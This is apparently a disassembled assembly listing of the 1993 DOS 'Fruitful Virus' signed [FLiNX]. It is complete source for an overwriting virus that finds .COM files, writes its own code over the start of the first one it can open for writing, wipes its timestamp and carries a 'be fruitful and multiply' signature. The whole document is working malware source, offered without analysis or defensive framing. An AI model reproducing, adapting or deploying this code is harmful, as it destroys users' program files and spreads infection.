PAGE  59,132

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                      ;;
;;;                 FRUITFUL                     ;;
;;;                                      ;;
;;;      Created:   22-Nov-93                            ;;
;;;      Passes:    9          Analysis Options on: none             ;;
;;;                                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a


        org 100h

fruitful    proc    far

start::
        mov si,15Bh
        mov ah,4Eh          ; 'N'
        xor cx,cx           ; Zero register
        mov dx,offset data_2    ; ('*.COM')
        int 21h         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        jc  loc_4           ; Jump if carry Set
loc_1::
        mov ah,2Fh          ; '/'
        int 21h         ; DOS Services  ah=function 2Fh
                        ;  get DTA ptr into es:bx
        mov ax,16h
        add bx,ax
        mov al,es:[bx]
        and al,7
        cmp al,0
        jne loc_2           ; Jump if not equal
        mov ah,4Fh          ; 'O'
        int 21h         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        jmp short loc_1
loc_2::
        mov ax,8
        add ax,bx
        mov dx,ax
        mov ax,3D01h
        int 21h         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        jnc loc_3           ; Jump if carry=0
        mov ah,4Fh          ; 'O'
        xor cx,cx           ; Zero register
        int 21h         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        jc  loc_4           ; Jump if carry Set
        jmp short loc_1
loc_3::
        mov bx,ax
        mov ah,40h          ; '@'
        mov cx,61h
        mov dx,100h
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file  bx=file handle
                        ;   cx=bytes from ds:dx buffer
        mov ax,5701h
        xor cx,cx           ; Zero register
        xor dx,dx           ; Zero register
        int 21h         ; DOS Services  ah=function 57h
                        ;  set file date+time, bx=handle
                        ;   cx=time, dx=time
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
loc_4::
        mov ah,4Ch          ; 'L'
        int 21h         ; DOS Services  ah=function 4Ch
                        ;  terminate with al=return code
data_2      db  '*.COM', 0
        db  'The Fruitful Virus - Be fruitful'
        db  ' and multiply! [FLiNX]'

fruitful    endp

seg_a       ends



        end start
